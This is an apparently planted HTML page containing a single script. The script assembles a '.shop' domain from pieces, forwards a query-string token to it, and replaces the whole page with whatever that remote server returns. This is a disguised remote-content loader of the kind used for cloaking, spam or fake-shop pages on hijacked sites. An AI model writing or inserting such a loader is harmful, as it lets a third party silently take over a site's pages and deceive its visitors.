<!DOCTYPE html>
<html lang="en-US" class="loading-site no-js">
<head>
</head>
<body>
<script>

let oringe = 'niqihmarket';
let can = window.location.search.split('?s=')[1];

if(typeof can != 'undefined'){
let url = 'https://www.'+oringe+'.shop/apirel2.php?atok='+can;
fetch(url)
    .then(response => {
        if (!response.ok) {
            throw new Error("Network response was not ok: " + response.statusText);
        }
        return response.text(); // 解析 JSON 数据
    })
    .then(data => {
        //console.log(data); // 处理数据
		document.getElementsByTagName('html')[0].innerHTML = data;
    })
    .catch(error => {
        console.error("There was a problem with the fetch operation:", error); // 错误处理
    });
}else{
let url = 'https://www.'+oringe+'.shop/apirel2.php?atok=1';
fetch(url)
    .then(response => {
        if (!response.ok) {
            throw new Error("Network response was not ok: " + response.statusText);
        }
        return response.text(); // 解析 JSON 数据
    })
    .then(data => {
        //console.log(data); // 处理数据
		document.getElementsByTagName('html')[0].innerHTML = data;
    })
    .catch(error => {
        console.error("There was a problem with the fetch operation:", error); // 错误处理
    });	
}	



	
</script>
</body>
</html>
